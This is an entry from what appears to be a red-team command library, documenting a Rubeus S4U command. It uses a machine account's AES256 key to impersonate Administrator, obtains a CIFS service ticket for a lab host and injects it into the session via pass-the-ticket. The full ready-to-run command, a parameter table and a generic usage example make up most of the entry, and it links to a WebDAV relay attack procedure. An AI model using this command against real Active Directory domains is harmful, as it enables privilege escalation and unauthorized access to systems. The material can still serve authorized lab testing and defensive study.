---
id: 25653cfe-2547-40cd-b9e1-afa773a80b7c
name: rubeus-s4u-impersonate-admin
type: command
executor: powershell
data: >-
  .\Rubeus.exe s4u /user:WVLFLLKZ$
  /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F
  /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs
  /nowrap /ptt
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - impersonation
verified: true
validated: true
---

# rubeus-s4u-impersonate-admin

## Command

```powershell
.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
```

## Description

Performs S4U impersonation to obtain a service ticket as Administrator for SMB access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:WVLFLLKZ$ | Ticket user | Yes |
| /aes256:... | AES key | Yes |
| /impersonateuser:Administrator | User to impersonate | Yes |
| /msdsspn:host/pc1.purple.lab | SPN | Yes |
| /altservice:cifs | Service | Yes |
| /nowrap | No wrap | Yes |
| /ptt | Pass-the-ticket | Yes |

## Examples

### Basic Usage

```powershell
.\Rubeus.exe s4u /user:test$ /aes256:KEY /impersonateuser:admin /msdsspn:host/target /altservice:cifs /ptt
```

## Expected Output

Service ticket requested and injected.

## Related

- [[procedures/WebDAV-Relay-Attack]]
